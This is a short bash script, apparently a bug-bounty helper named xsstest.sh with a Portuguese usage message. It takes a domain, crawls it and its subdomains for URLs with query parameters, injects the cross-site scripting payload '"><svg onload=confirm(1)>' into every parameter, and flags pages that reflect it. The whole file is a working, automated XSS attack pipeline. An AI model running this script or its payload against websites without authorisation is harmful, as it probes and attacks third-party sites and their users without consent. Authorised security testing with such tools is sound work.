#!/bin/bash

if [ -z "$1" ]; then
  echo "Forma de usar: ./xsstest.sh exemplo.com"
  exit 1
fi

url="$1"

echo "$url" | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'